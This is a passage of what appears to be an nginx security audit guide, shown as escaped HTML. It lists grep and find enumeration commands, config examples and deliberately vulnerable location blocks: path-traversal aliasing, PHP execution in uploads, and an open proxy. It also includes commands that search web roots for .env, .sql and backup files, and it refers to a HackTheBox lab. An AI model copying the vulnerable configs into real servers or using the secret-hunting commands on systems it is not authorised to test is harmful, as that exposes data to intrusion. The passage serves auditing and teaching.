/etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for HSTS headers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;Strict-Transport-Security\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for security headers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;add_header\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"location-block-analysis\"\u003eLocation Block Analysis\u003c/h2\u003e\n\u003ch3 id=\"location-matching-patterns\"\u003eLocation Matching Patterns\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Exact match\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e/exact-path\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003ereturn\u003c/span\u003e \u003cspan class=\"mi\"\u003e200\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;Exact\u003c/span\u003e \u003cspan class=\"s\"\u003ematch\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Prefix match\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/prefix\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Matches /prefix, /prefix/, /prefix/anything\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Regular expression (case sensitive)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"p\"\u003e~\u003c/span\u003e \u003cspan class=\"sr\"\u003e\\.php$\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Matches files ending with .php\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Regular expression (case insensitive)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"p\"\u003e~\u003c/span\u003e\u003cspan class=\"sr\"\u003e*\u003c/span\u003e \u003cspan class=\"s\"\u003e\\.(jpg|jpeg|png|gif)\u003c/span\u003e$ \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Matches image files (case insensitive)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Prefix match with priority\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e^~\u003c/span\u003e \u003cspan class=\"s\"\u003e/priority\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# High priority prefix match\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"security-critical-locations\"\u003eSecurity-Critical Locations\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for admin/management interfaces\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;location.*admin\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;location.*management\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;location.*dashboard\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for file upload locations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;location.*upload\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;client_max_body_size\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for API endpoints\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;location.*api\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;location.*/api\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for hidden files/directories\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;location.*\\\\\\.\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"dangerous-location-configurations\"\u003eDangerous Location Configurations\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Dangerous: Unrestricted file access\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/files/\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003ealias\u003c/span\u003e \u003cspan class=\"s\"\u003e/var/www/files/\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Can lead to path traversal\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Dangerous: PHP execution in upload directory\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/uploads/\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elocation\u003c/span\u003e \u003cspan class=\"p\"\u003e~\u003c/span\u003e \u003cspan class=\"sr\"\u003e\\.php$\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003efastcgi_pass\u003c/span\u003e \u003cspan class=\"s\"\u003eunix:/var/run/php/php7.4-fmp.sock\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# Allows execution of uploaded PHP files\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Dangerous: Proxy without validation\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/proxy/\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eproxy_pass\u003c/span\u003e \u003cspan class=\"nv\"\u003e$arg_url\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Open proxy vulnerability\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"access-control-analysis\"\u003eAccess Control Analysis\u003c/h2\u003e\n\u003ch3 id=\"access-restrictions\"\u003eAccess Restrictions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# IP-based access control\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/admin\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eallow\u003c/span\u003e \u003cspan class=\"n\"\u003e192.168.1.0\u003c/span\u003e\u003cspan class=\"s\"\u003e/24\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eallow\u003c/span\u003e \u003cspan class=\"n\"\u003e127.0.0.1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003edeny\u003c/span\u003e \u003cspan class=\"s\"\u003eall\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Authentication required\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/protected\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eauth_basic\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;Protected\u003c/span\u003e \u003cspan class=\"s\"\u003eArea\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eauth_basic_user_file\u003c/span\u003e \u003cspan class=\"s\"\u003e/etc/nginx/.htpasswd\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Rate limiting\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elimit_req_zone\u003c/span\u003e \u003cspan class=\"nv\"\u003e$binary_remote_addr\u003c/span\u003e \u003cspan class=\"s\"\u003ezone=login:10m\u003c/span\u003e \u003cspan class=\"s\"\u003erate=1r/s\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/login\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elimit_req\u003c/span\u003e \u003cspan class=\"s\"\u003ezone=login\u003c/span\u003e \u003cspan class=\"s\"\u003eburst=5\u003c/span\u003e \u003cspan class=\"s\"\u003enodelay\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"access-control-issues\"\u003eAccess Control Issues\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for missing access controls\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;allow\\|deny\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;auth_basic\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for rate limiting\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;limit_req\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;limit_conn\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for CORS configurations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;add_header.*Access-Control\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"file-and-directory-analysis\"\u003eFile and Directory Analysis\u003c/h2\u003e\n\u003ch3 id=\"document-root-analysis\"\u003eDocument Root Analysis\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find document roots\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;root \u0026#34;\u003c/span\u003e /etc/nginx/sites-available/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;alias \u0026#34;\u003c/span\u003e /etc/nginx/sites-available/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check document root permissions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /var/www/html/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /root/app/views/  \u003cspan class=\"c1\"\u003e# From Soccer HTB example\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Look for sensitive files in document roots\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /var/www/ -name \u003cspan class=\"s2\"\u003e\u0026#34;*.conf\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.config\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.bak\u0026#34;\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /var/www/ -name \u003cspan class=\"s2\"\u003e\u0026#34;.env\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.sql\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.log\u0026#34;\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"file-serving-configuration\"\u003eFile Serving Configuration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check autoindex settings\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;autoindex\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for hidden file access\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;location.*\\\\\\.\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check MIME type configurations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;mime.types\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;default_type\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"log-analysis\"\u003eLog Analysis\u003c/h2\u003e\n\u003ch3 id=\"nginx-log-configuration\"\u003eNginx Log Configuration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Access log format\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elog_format\u003c/span\u003e \u003cspan class=\"s\"\u003emain\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$remote_addr\u003c/span\u003e \u003cspan class=\"s\"\u003e-\u003c/span\u003e \u003cspan class=\"nv\"\u003e$remote_user\u003c/span\u003e \u003cspan class=\"s\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$time_local]\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$request\u0026#34;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$status\u003c/span\u003e \u003cspan class=\"nv\"\u003e$body_bytes_sent\u003c/span\u003e \u003cspan 